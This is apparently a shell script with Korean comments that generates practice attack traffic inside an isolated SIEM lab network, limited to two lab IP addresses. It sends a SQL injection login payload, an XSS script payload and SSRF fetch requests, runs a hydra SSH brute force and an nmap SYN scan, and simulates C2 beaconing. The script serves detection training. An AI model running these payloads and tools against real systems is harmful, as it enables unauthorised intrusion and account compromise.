#!/bin/sh
# 격리된 mini-siem-net 안에서만 4종 실습 트래픽을 만듭니다.
# 학교·회사·가정 네트워크나 172.28.0.10 / 172.28.0.11 이외의 대상을 넣지 마세요.
set -eu

WEB="${WEB:-172.28.0.10}"
PC="${PC:-172.28.0.11}"

echo "[1] 정상 로그인 (200) 와 실패 로그인 (403)"
curl -sS -o /tmp/out_ok.html -w "normal_login HTTP %{http_code}\n" \
  "http://${WEB}/login?username=labuser&password=labpass"
curl -sS -o /tmp/out_fail.html -w "failed_login HTTP %{http_code}\n" \
  "http://${WEB}/login?username=labuser&password=wrongpass"

echo "[2] SQL 인젝션 — 성공 시 200 이어야 SEV1 격상 시연이 됩니다"
curl -sS -o /tmp/out_sqli.html -w "sqli HTTP %{http_code}\n" \
  "http://${WEB}/login?username=admin'%20OR%20'1'='1'--&password=test"

echo "[3] XSS + 마스킹 시험용 가짜 password= 파라미터"
curl -sS -o /tmp/out_xss.html -w "xss HTTP %{http_code}\n" \
  "http://${WEB}/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
curl -sS -o /tmp/out_mask.html -w "mask_param HTTP %{http_code}\n" \
  "http://${WEB}/login?username=labuser&password=fake_token_value"

echo "[4] SSH 무차별 대입 (hydra, 실습 계정 labuser)"
hydra -l labuser -P /lab/passwords.txt -t 4 -w 3 "ssh://${PC}/" || true

echo "[5] 포트 스캔 (SYN, 웹과 PC 모두 — README 범위)"
nmap -sS -Pn -T4 -p 1-100 "${WEB}" "${PC}" || nmap -sT -Pn -T4 -p 1-100 "${WEB}" "${PC}"

echo "[6] C2 beacon — victim-web:8443 30초 안 5회"
for i in 1 2 3 4 5; do
  echo "c2 connection ${i}"
  curl -sS --connect-timeout 2 \
    "http://${WEB}:8443/health" >/dev/null || true
  sleep 6
done

echo "[7] SSRF — 내부 조회 성공 200"
curl -sS -o /tmp/out_ssrf_ok.html -w "ssrf_success HTTP %{http_code}\n" \
  "http://${WEB}/fetch?url=http%3A%2F%2F${WEB}%2Fhealth"

echo "[8] SSRF — 내부 조회 실패 403"
curl -sS -o /tmp/out_ssrf_fail.html -w "ssrf_failure HTTP %{http_code}\n" \
  "http://${WEB}/fetch?url=http%3A%2F%2F${PC}%3A8080%2Fhealth"

echo "실습 트래픽 생성 끝."
